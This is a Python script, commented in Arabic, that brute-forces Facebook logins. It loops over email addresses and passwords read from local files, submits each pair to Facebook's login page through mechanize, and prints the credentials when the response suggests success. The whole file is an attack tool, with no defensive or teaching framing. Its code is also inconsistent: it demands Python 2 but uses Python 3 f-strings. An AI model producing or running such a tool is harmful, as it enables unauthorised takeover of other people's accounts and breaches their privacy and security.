import time
import sys

# التحقق من إصدار بايثون
if sys.version_info[0] != 2: 
    print('''--------------------------------------
    REQUIRED PYTHON 2.x
    use: python fb2.py
--------------------------------------''')
    sys.exit()

post_url = 'https://www.facebook.com/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

# إعداد مكتبة mechanize
try:
    import mechanize
    import urllib2
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent', headers['User-Agent'])]
    browser.set_handle_robots(False)
except:
    print('\n\tPlease install mechanize.\n')
    sys.exit()

print('\n---------- Welcome To Facebook BruteForce ----------\n')

# فتح ملفات البريد الإلكتروني وكلمات المرور
try:
    email_file = open('email.txt', 'r')
    password_file = open('passwords.txt', 'r')
except IOError:
    print('Error: Could not find email.txt or passwords.txt.')
    sys.exit()

# قراءة جميع عناوين البريد الإلكتروني
emails = email_file.readlines()
passwords = password_file.readlines()

# إغلاق الملفات بعد القراءة
email_file.close()
password_file.close()

print('\nTrying combinations from email.txt and passwords.txt ...\n')

# تجربة كل بريد إلكتروني مع كل كلمة مرور
for email in emails:
    email = email.strip()
    if not email:
        continue

    print("\nTarget Email ID : ", email)

    for i, password in enumerate(passwords, start=1):
        password = password.strip()
        if len(password) < 6:
            continue

        print(f"Trying {i}: {password}")

        try:
            response = browser.open(post_url)
            if response.code == 200:
                browser.select_form(nr=0)
                browser.form['email'] = email
                browser.form['pass'] = password
                response = browser.submit()
                response_data = response.read()

                # التحقق من نجاح تسجيل الدخول
                if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
                    print('Success!')
                    print(f"Email: {email}")
                    print(f"Password: {password}")
                    break
        except Exception as e:
            print(f"Error: {e}. Sleeping for 5 minutes...")
            time.sleep(300)
